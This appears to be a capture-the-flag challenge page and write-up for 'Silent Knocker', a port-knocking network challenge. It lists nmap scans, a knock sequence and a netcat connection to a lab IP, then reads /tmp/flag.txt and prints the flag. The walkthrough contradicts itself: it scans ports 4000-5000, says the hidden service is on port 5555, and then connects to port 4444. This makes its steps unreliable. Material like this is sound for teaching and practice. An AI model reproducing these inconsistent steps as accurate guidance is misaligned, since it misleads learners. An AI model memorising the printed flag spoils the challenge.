<img src="Resources/UCTF.jpg" title="UCTF" alt="UCTF" data-align="center">

# Silent Knocker

Your mission is to bypass a firewall using secret knocks to exploit a hidden service and retrieve the flag. The target IP is **5.34.192.183**. Will you be able to figure out the sequence and reveal the hidden path?

**Explore the silent streets of ancient Persia, but beware, only the right knocks will open the gates.**

<img src="Resources/Iran.png" title="Iran" alt="Iran" data-align="center">

# Write Up

To solve this challenge, you'll need a few tools such as `knockd`, `netcat`, and `nmap`. Follow these steps:

### Step 1: Reconnaissance (Scanning for Open Ports)
Scan the target server for open ports using `nmap`:
```
nmap -sS -p- 5.34.192.183
```

### Step 2: Discovering the Port Knocking Sequence
Use a port knocking tool like `knockd` to send the correct sequence of knocks:
```
knock 5.34.192.183 1111 2222 3333
```

### Step 3: Confirming the Hidden Service
After sending the knocks, scan the higher range of ports to find the hidden service:
```
nmap -p 4000-5000 5.34.192.183
```

### Step 4: Connecting to the Hidden Service
Once you've found the service on port 5555, connect using `netcat`:
```
nc 5.34.192.183 4444
```

### Step 5: Retrieving the Flag
Navigate to the location of the flag:
```
cat /tmp/flag.txt
```

## Write Up Video

There are no Video Write-ups available for this challenge at the moment.

# Flag

The flag for this challenge is:

**flag: uctf{tr4ct0r-f00tb411-clu6}**


# Categories

Check the categories which the challenge belongs to.

- [x] Network
- [ ] Web
- [ ] Reverse
- [ ] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Blockchain
- [ ] Steganography
- [ ] AI
- [ ] Data Science

# Points

| Warm up | This Challenge  | Evil |
| ------- |:---------------:| ----:|
| 25      |      400        | 500  |

# Resources

No additional resources are required to solve this challenge.